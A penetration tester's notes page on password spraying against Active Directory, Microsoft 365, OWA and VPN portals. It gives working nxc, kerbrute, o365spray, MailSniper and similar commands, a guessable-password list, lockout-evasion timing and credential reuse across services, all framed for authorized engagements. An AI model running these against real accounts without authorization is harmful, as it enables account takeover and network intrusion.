---
tags: [pentest, spray, credentials, ad, strategy, initial-access]
phase: 5
---
# Password Spraying Strategy

The discipline of "one (or few) password(s) against many users." The right way to attack credentials on accounts that have lockout policies.

[[06 - Gaining Access/00 - README|Folder index]]

## Spray vs. brute

| | Brute force | Spray |
| --- | --- | --- |
| Approach | Many passwords vs. 1 user | 1 password vs. many users |
| Detection | Lockout after 3-5 attempts | Slow; harder to detect |
| Use when | You know the user; lockout not configured | Lockout is configured (almost always) |

## Pre-spray checklist

1. **Read the lockout policy** (mandatory).
   ```bash
   nxc smb <dc-ip> -u user -p '' --pass-pol
   ```
   Look for: `Account lockout threshold: 5`, `Reset count after: 30 minutes`.

2. **Build a target user list** (don't waste attempts on non-existent users).
   ```bash
   # From null session
   nxc smb <dc-ip> -u '' -p '' --rid-brute > users.raw
   awk -F: '/SidTypeUser/{print $1}' users.raw | sort -u > users.txt

   # Or kerbrute (no creds needed against DC)
   kerbrute userenum -d corp.local --dc <dc-ip> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o valid.txt
   ```

3. **Pick the right candidate passwords**.
https://github.com/ihebski/DefaultCreds-cheat-sheet
pip3 install defaultcreds-cheat-sheet
creds search query

https://www.softwaretestinghelp.com/default-router-username-and-password-list/
## Candidate password list (try in this order)

```text
# Seasonal / company
Spring2026!
Summer2026!
Welcome2026!
Welcome1
Password1
<Company>1!
<Company>2026!

# Default-ish
Password123
P@ssw0rd
P@ssword1
Hello123!
Changeme1

# Empty / null
(empty)

# Username = password
<user>:<user>
```

## Time your spray to NOT trigger lockout

If policy says **threshold 5, reset after 30 min**:

- Max 4 attempts per user per 30 min (1 below threshold).
- Spread spray attempts at least 30 min apart per user.

```bash
# nxc with delay between attempts
nxc smb <range> -u users.txt -p 'Welcome2026!' --continue-on-success
# Then wait 35 min before next spray
sleep 2100; nxc smb <range> -u users.txt -p 'Spring2026!' --continue-on-success
```

## Where to spray

```bash
# Internal AD - against DC (smb / kerberos)
nxc smb <dc-ip> -u users.txt -p '<password>' --continue-on-success

# Against M365 / Azure AD (cloud)
# Use MSOLSpray / Spray365 / TREVORspray / o365spray
o365spray --validate --domain corp.com
o365spray --password Welcome2026! --userlist users.txt --domain corp.com
TREVORspray --users users.txt --passwords spray.txt

# OWA / Exchange
ruler --domain corp.com brute --users users.txt --passwords spray.txt
MailSniper.ps1 -Action Spray -Userlist users.txt -Password 'Welcome2026!'

# VPN / Citrix portal
hydra ... http-post-form  (with the form module - careful: web portals often *don't* lock out, but they alert)
```

## Detecting lockout while spraying

```text
nxc output:
  STATUS_ACCOUNT_LOCKED_OUT  ← STOP IMMEDIATELY for that user
  STATUS_PASSWORD_MUST_CHANGE ← Valid cred; reset password
  STATUS_PASSWORD_EXPIRED     ← Valid; reset
```

If lockouts accumulate, you'll cause an incident. Stop and notify client per ROE.

## Spray "in the open" - cloud / OWA gotchas

- M365 has its own throttling separate from on-prem AD.
- Don't trust "this didn't lock" - it may have soft-locked silently and just dropped responses.
- Always validate at least one cred manually after a spray run.

## After a hit

```bash
# Validate
nxc smb <ip> -u found_user -p Welcome2026!

# Then immediately try every service with that cred
for proto in smb winrm mssql rdp ssh ftp; do
  nxc $proto <range> -u found_user -p Welcome2026!
done

# And try the password across the user list (in case of password reuse)
nxc smb <range> -u users.txt -p Welcome2026!
```

## When you see X, do Y

| Symptom | Action |
| --- | --- |
| 0 hits across 1000 users with rockyou top 10 | Verify users actually exist. Re-enumerate. |
| Hit on `guest` or `defaultaccount` | Often disabled in policy - validate before celebrating |
| `STATUS_LOGON_FAILURE` for every user | Maybe domain prefix wrong - try `nxc smb -d corp.local` explicitly |
| Lockouts appearing | Stop. Wait reset window. Reduce velocity. Notify if engagement-affecting. |
| All return `STATUS_PASSWORD_MUST_CHANGE` | Spray landed on a default initial password - check if reset by user |

> [!warning] Operational discipline
> Spraying is a credential attack with real impact. Document every spray attempt: timestamp, users targeted, password used, results. This protects you AND helps the client see what happened.
